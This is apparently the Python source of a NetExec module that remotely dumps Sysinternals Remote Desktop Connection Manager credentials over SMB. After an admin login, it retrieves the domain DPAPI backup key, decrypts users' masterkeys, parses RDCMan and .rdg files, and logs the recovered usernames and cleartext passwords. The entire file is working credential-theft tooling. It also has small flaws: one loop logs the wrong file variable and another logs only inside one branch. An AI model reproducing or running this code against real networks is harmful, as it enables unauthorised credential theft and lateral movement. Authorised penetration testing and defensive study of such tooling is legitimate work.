from dploot.triage.rdg import RDGTriage, RDGServerProfile
from dploot.lib.target import Target

from nxc.helpers.logger import highlight
from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection


class NXCModule:
    name = "rdcman"
    description = "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        username = connection.username
        password = getattr(connection, "password", "")
        nthash = getattr(connection, "nthash", "")

        self.pvkbytes = get_domain_backup_key(connection)

        target = Target.create(
            domain=connection.domain,
            username=username,
            password=password,
            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
            lmhash=getattr(connection, "lmhash", ""),
            nthash=nthash,
            do_kerberos=connection.kerberos,
            aesKey=connection.aesKey,
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )
        
        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
        if conn is None:
            context.log.debug("Could not upgrade connection")
            return

        self.masterkeys = collect_masterkeys_from_target(connection, target, conn, system=False)

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting RDCMan secrets")

        try:
            triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)
            rdcman_files, rdgfiles = triage.triage_rdcman()
            for rdcman_file in rdcman_files:
                if rdcman_file is None:
                    continue
                for rdg_cred in rdcman_file.rdg_creds:
                    log_text = f"{rdg_cred.username}:{rdg_cred.password.decode('latin-1')}"
                    if isinstance(rdg_cred, RDGServerProfile):
                        log_text = f"{rdg_cred.server_name} - {log_text}"
                        context.log.highlight(f"[{rdcman_file.winuser}][{rdg_cred.profile_name}] {log_text}")
            for rdgfile in rdgfiles:
                if rdgfile is None:
                    continue
                for rdg_cred in rdgfile.rdg_creds:
                    log_text = f"{rdg_cred.username}:{rdg_cred.password.decode('latin-1')}"
                    if isinstance(rdg_cred, RDGServerProfile):
                        log_text = f"{rdg_cred.server_name} - {log_text}"
                    context.log.highlight(f"[{rdcman_file.winuser}][{rdg_cred.profile_name}] {log_text}")
        except Exception as e:
            context.log.debug(f"Could not loot RDCMan secrets: {e}")
